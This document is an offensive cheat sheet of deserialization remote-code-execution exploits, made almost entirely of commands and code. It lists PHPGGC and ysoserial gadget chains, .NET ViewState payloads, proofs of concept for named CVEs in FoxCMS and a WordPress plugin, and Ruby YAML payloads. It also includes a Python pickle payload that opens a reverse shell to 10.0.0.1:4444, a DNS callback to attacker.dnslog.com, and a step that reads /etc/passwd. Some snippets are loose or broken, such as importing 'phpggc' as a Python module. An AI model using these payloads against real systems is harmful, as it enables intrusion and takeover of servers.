# Deserialization RCE — Complete Exploit Guide
## Last Updated: Mon Jul 06 2026

## ==========================================
## PHP — PHPGGC
## ==========================================

### Install PHPGGC
git clone https://github.com/ambionics/phpggc /tmp/phpggc 2>/dev/null
cd /tmp/phpggc

### List all gadget chains
./phpggc -l

### Common chains:
# Laravel RCE
./phpggc Laravel/RCE1 system id

# WordPress RCE  
./phpggc WordPress/RCE system id

# CodeIgniter RCE
./phpggc CodeIgniter/RCE1 system id

# Zend Framework RCE
./phpggc ZendFramework/RCE1 system id

# SwiftMailer RCE
./phpggc SwiftMailer/FW1 system id

# Monolog RCE
./phpggc Monolog/RCE1 system id

# Native PHP RCE (no framework)
./phpggc PHP/RCE system id

### Custom payload with parameters
./phpggc -p custom -c "cat /etc/passwd" Laravel/RCE1

### Output as URL-encoded
./phpggc -u Laravel/RCE1 system id

### Output as raw (for POST)
./phpggc -r Laravel/RCE1 system id

### Phar deserialization
./phpggc -o phar -r Laravel/RCE1 system id > shell.phar
# Then upload shell.phar and trigger via phar://

## ==========================================
## JAVA — Ysoserial
## ==========================================

### Common ysoserial chains:
java -jar /tmp/ysoserial-all.jar CommonsCollections1 'id'
java -jar /tmp/ysoserial-all.jar CommonsCollections2 'id'
java -jar /tmp/ysoserial-all.jar CommonsCollections4 'id'
java -jar /tmp/ysoserial-all.jar CommonsCollections5 'id'
java -jar /tmp/ysoserial-all.jar CommonsCollections6 'id'
java -jar /tmp/ysoserial-all.jar CommonsCollections7 'id'
java -jar /tmp/ysoserial-all.jar CommonsBeanutils1 'id'
java -jar /tmp/ysoserial-all.jar JBossInterceptors1 'id'
java -jar /tmp/ysoserial-all.jar Jdk7u21 'id'
java -jar /tmp/ysoserial-all.jar Spring1 'id'
java -jar /tmp/ysoserial-all.jar C3P0 'id'
java -jar /tmp/ysoserial-all.jar URLDNS 'http://attacker.dnslog.com'  # OOB detection

### Encode for HTTP transmission
java -jar /tmp/ysoserial-all.jar CommonsCollections1 'id' | base64 -w0

### Detection points:
# - Cookie: JSESSIONID, remember-me
# - POST body (serialized Java objects start with \xac\xed\x00\x05)
# - Request headers
# - URL parameters

## ==========================================
## PYTHON PICKLE
## ==========================================

### Basic pickle RCE payload
python3 -c "
import pickle, os, base64

class RCE:
    def __reduce__(self):
        return (os.system, ('id',))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(payload)
"

### More complex reverse shell
python3 -c "
import pickle, os, base64

class RCE:
    def __reduce__(self):
        return (os.system, ('bash -c \"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\"',))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(payload)
"

### Flask session cookie forge (if SECRET_KEY known)
python3 -c "
from flask.sessions import session_json_serializer
from itsdangerous import URLSafeTimedSerializer
import pickle, base64

# Known secret key → forge signed cookie with pickled RCE
# Or use: flask-unsign
"

### Detection points:
# - Flask session cookies (base64 encoded, often start with .eJw...)
# - Django signed cookies (if SECRET_KEY cracked)
# - pickle.loads() in API endpoints

## ==========================================
## .NET ViewState — YSoSerial.net
## ==========================================

### ViewState generation with known MAC key
ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "powershell -e <encoded>"

### ViewState MAC bypass (CVE-2024-28938)
# If MAC key not known, some bypass techniques exist
# Check: __VIEWSTATEGENERATOR, __VIEWSTATEENCRYPTED

### Detection:
# - __VIEWSTATE parameter in ASP.NET pages
# - __VIEWSTATEGENERATOR

## ==========================================
## CVE-2025-29306 — FoxCMS PHP Object Injection
## ==========================================

### The vulnerability is in index.html component
### Attack vector: unserialize() on attacker-controlled input
### PoC:
import requests, base64, phpggc  # Use PHPGGC or manual

# PHP serialized payload (example using PHPGGC output)
payload = 'O:...'  # PHPGGC generated serialized object
r = requests.post('http://target/index.html', data={
    'data': payload
})
print(r.text)

## ==========================================
## CVE-2025-7384 — WordPress PHP Object Injection
## ==========================================

### Plugin: Database for Contact Form 7, WPforms, Elementor forms <= 1.4.3
### Function: get_lead_detail() deserializes untrusted input
### Requires Contact Form 7 plugin for POP chain

### Detection:
curl -sk "http://target/wp-content/plugins/database-for-contact-form-7/"

### Exploit (using PHPGGC + WordPress chain):
./phpggc WordPress/RCE system "id"
# POST serialized payload to vulnerable endpoint

## ==========================================
## RUBY YAML (Psych) Deserialization
## ==========================================

### Basic YAML deser RCE
payload = """
--- !ruby/object:ERB
template: <%= system('id') %>
"""
requests.post(url, data=payload)

### More advanced
"""
--- !ruby/object:Kernel
system: id
"""

